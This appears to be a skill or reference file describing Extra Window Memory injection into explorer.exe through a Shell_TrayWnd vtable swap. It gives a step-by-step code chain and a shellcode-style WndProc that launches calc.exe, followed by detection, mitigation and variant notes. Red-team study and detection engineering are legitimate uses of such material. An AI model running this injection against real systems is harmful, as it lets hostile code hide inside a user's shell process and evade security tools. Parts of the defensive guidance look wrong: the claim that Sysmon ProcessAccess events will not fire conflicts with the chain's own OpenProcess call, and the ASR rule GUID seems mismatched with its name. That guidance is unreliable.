---
name: ewm-ctray-injection
description: Extra Window Memory injection via Shell_TrayWnd / CTray vtable swap in explorer.exe -- MITRE T1055.011. Replace vtable's WndProc with a shellcode address, trigger via PostMessage.
---

# Extra Window Memory (EWM) Injection

MITRE ATT&CK: **T1055.011** -- Process Injection: Extra Window Memory Injection.

## Background

Every registered window class can request up to **40 bytes of Extra Window Memory** at registration
time (`WNDCLASSEX::cbWndExtra`). This EWM is attached to each window instance of that class and
accessed with `GetWindowLongPtr` / `SetWindowLongPtr(hwnd, offset, value)`.

Legitimate uses: storing per-window state (document pointer, settings, status). Some privileged
system windows store **pointers to objects whose vtable the window procedure dispatches through**.

The canonical target is `Shell_TrayWnd` (owned by `explorer.exe`), whose EWM at offset 0 holds a
pointer to a `CTray` object. The window message pump jumps through that object's vtable to reach
the real `WndProc`.

## Why It's Attractive

- The hijacked execution lands inside `explorer.exe` -- a long-running, user-mode SYSTEM-adjacent
  process present on every logon session.
- No `CreateRemoteThread` is used. The attacker never spawns a thread; the OS's window message
  pump does the work when any window message arrives.
- The injection point is a legitimate OS mechanism (window class state).

## Attack Chain

```
┌───────────────────────────────────────────────────────────────────────────┐
│  1. hw   = FindWindow("Shell_TrayWnd", NULL);                             │
│  2. GetWindowThreadProcessId(hw, &pid);     // explorer.exe PID           │
│  3. hp   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);                   │
│                                                                           │
│  4. ctp  = GetWindowLongPtr(hw, 0);          // ptr to CTray object       │
│  5. ReadProcessMemory(hp, ctp, &ct.vTable, 8, &wr);                       │
│  6. ReadProcessMemory(hp, ct.vTable, &ct.AddRef, 8 * 3, &wr);             │
│                                                                           │
│  7. cs   = VirtualAllocEx(hp, 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);│
│  8. WriteProcessMemory(hp, cs, payload, size, &wr);                       │
│                                                                           │
│  9. ds   = VirtualAllocEx(hp, 0, sizeof(CTray), MEM_COMMIT, PAGE_READWRITE);│
│ 10. ct.vTable  = (ULONG_PTR)ds + sizeof(ULONG_PTR);                       │
│     ct.WndProc = (ULONG_PTR)cs;      // shellcode address                 │
│     WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr);                     │
│                                                                           │
│ 11. SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);  // flip the vtable pointer   │
│ 12. PostMessage(hw, WM_CLOSE, 0, 0);          // fire                     │
│ 13. SetWindowLongPtr(hw, 0, ctp);             // restore                  │
│ 14. VirtualFreeEx + CloseHandle cleanup                                   │
└───────────────────────────────────────────────────────────────────────────┘
```

Step 12 causes the `WM_CLOSE` message to go through the window procedure, which dereferences the
hijacked vtable, which points at the attacker's shellcode. The shellcode runs **in explorer.exe's
address space, as the explorer user**.

Shellcode example (manual GetProcAddress of `WinExec`, fire `calc.exe`):

```c
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM w, LPARAM l) {
    if (uMsg != WM_CLOSE) return 0;
    DWORD szWinExec[2] = { 0x456E6957, 0x00636578 };   // "WinExec\0"
    DWORD szCalc  [2] = { 0x636C6163, 0 };              // "calc\0"
    auto p = (WinExec_t)xGetProcAddress(szWinExec);
    if (p) p((LPSTR)szCalc, SW_SHOW);
    return 0;
}
```

The shellcode must obey the `WndProc` calling convention and return a sane value or the message
pump will be confused on the next tick.

## Detection

- Any process calling `SetWindowLongPtr` on a window it doesn't own, where the target class is
  `Shell_TrayWnd`, is high-signal. Few legitimate programs do this.
- `OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid)` from a non-system non-explorer-whitelisted
  process is anomalous.
- RWX allocation inside `explorer.exe` is itself worth alerting on (explorer should not have
  attacker-shaped `MEM_PRIVATE | PAGE_EXECUTE_READWRITE` regions).
- Sysmon Event ID 10 (`ProcessAccess`) + ID 8 (`CreateRemoteThread`) won't fire because no thread
  is created, but Event ID 7 (`ImageLoaded`) will reveal attacker DLLs if the shellcode calls
  `LoadLibrary`.

## Mitigations

- Modern Windows applies **CFG** inside explorer.exe -- the indirect call through the hijacked vtable
  is checked against the compiler-emitted CFG bitmap. The attacker's shellcode address is not in
  the bitmap, call aborts.
- EDRs instrument `SetWindowLongPtr` cross-process calls.
- Credential Guard / HVCI makes it harder for malware to run arbitrary RWX code at explorer's
  privilege.
- Attack Surface Reduction rule `GUID D1E49AAC-8F56-4280-B9BA-993A6D77406C` (`Block executable
  content from email client and webmail`) blocks the common initial-access chain that drops the
  EWM injector.

## Variants

- Other windows with `cbWndExtra > 0` whose EWM slot is a vtable pointer:
  `Shell_TrayWnd`, `Progman`, `TrayNotifyWnd`, `ReBarWindow32`, `MSTaskSwWClass`.
- `SetWindowSubclass` + `DefSubclassProc` offers a legitimate-looking subclass chain that can be
  used to insert a hook into the message pump without the obvious vtable swap.
